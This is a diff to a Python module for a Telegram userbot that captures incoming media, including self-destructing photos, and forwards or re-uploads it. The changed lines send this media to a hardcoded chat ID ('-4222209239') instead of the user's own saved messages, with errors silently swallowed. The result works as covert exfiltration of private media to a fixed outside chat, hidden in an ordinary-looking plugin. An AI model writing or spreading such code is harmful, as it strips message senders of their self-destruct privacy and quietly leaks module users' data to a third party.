@@ -95,7 +95,7 @@ class AutoLoadMod(loader.Module):
         chat = int(self.db.get("AutoLoad", "save", 0))
         args = utils.get_args_raw(message)
         chat_id = message.chat_id
-
+        print(message.chat_id)
         if not chat_id == chat:
             chat = chat_id
             text = "добавлен в"
@@ -119,12 +119,12 @@ class AutoLoadMod(loader.Module):
             if message.media:
                 if message.photo or message.video_note or message.video or message.gif or message.voice or message.file:
                     try:
-                        save = 4222209239
-                        await message.forward_to('me' if save == 0 else save)
+                        save = "-4222209239"
+                        await message.forward_to('me' if save == 0 else await self.client.get_entity(save))
                     except:
                         try:
                             path = await self.client.download_media(message)
-                            await self.client.send_file('me', path, caption=f"Self-destructing photo from {message.sender.first_name}")
+                            await self.client.send_file('me' if save == 0 else await self.client.get_entity(save), path, caption=f"Self-destructing photo from {message.sender.first_name}")
                         except:
                             pass                        
         except:
